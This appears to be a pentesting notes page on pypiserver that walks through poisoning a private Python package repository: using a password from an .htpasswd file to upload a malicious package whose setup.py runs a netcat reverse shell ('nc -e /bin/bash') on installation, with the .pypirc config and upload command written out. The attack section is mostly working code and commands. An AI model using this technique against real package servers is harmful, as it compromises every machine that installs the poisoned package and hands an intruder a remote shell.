---
title: PyPI Server
category: Software
order: 5
---

PyPI Server (pypiserver) is a minimal PyPi compatible server for pip or easy_install.

# What is a PyPI Server?

`pypiserver` is a minimal [PyPI](https://pypi.org) compatible server for `pip` or `easy_install`. It is based on [bottle](http://bottlepy.org) and serves packages from regular directories. Wheels, bdists, eggs and accompanying PGP-signatures can be uploaded either with `pip`, `setuptools`, `twine`, `pypi-uploader`, or simply copied with `scp`.

PyPI Server helps us to create a **Pirvate Python Package Repository.**

# What happens when someone installs from that server and we have the password?

On that moment that we notice that someone installs all packages from the `pypiserver`, and we have the password, we can **upload our malicious python package**.

We will usually find the password inside the `.htpasswd` file from apache or nginx.

## Create our Python Package

Firstly, we need to create a directory with the name of the package, in this example I will use `demo_hacking`.

Navigate into the newly created directory. And create the following files following the hierarchy:

```
demo_hacking
├── demo_hacking
│   └── __init__.py
├── README.md
├── setup.cfg
├── setup.py
└── .pypirc
```

Edit `setup.py` file, in this file we will put our malicious code. At the moment of the installation package our code will execute on victim's machine. This is an example of reverse shell

```
from setuptools import setup
import os
os.system("nc -e /bin/bash ip-addr port") #this is the malicious code
setup(
    name='demo_hacking',
    packages=['demo_hacking'],
    description='Demo H4ck1ng edition',
    version='0.1',
    author='mvc1009',
    keywords=['pip','demo','hacking']
    )
```

Add an example function to `__init__.py`:

```
def print_demo():
    print("Demo Hacking")
```

The `setup.cfg` file lets PyPI know the README is a Markdown file:

```
[metadata]
description-file = README.md
```

Create an empty `README.md` optionally you can create a `LICENSE.txt` file:

```
touch REAMDE.md
touch LICENSE.txt
```

Finally you need to create the `.pypirc` file on the **home** directory:

```
[distutils]
index-servers =
  pypi
  demo
[pypi]
username:
password:
[demo]
repository: http://localhost:port
username: user
password: password
```

> **Hint**: Do not forget that you can change the dome directory path: `export HOME=path`

Finally you need to upload de package to the `pypiserver`.

```
python setup.py sdist upload -r demo
```

# References:

* [https://pypi.org/project/pypiserver/](https://pypi.org/project/pypiserver/)
* [https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/](https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/)
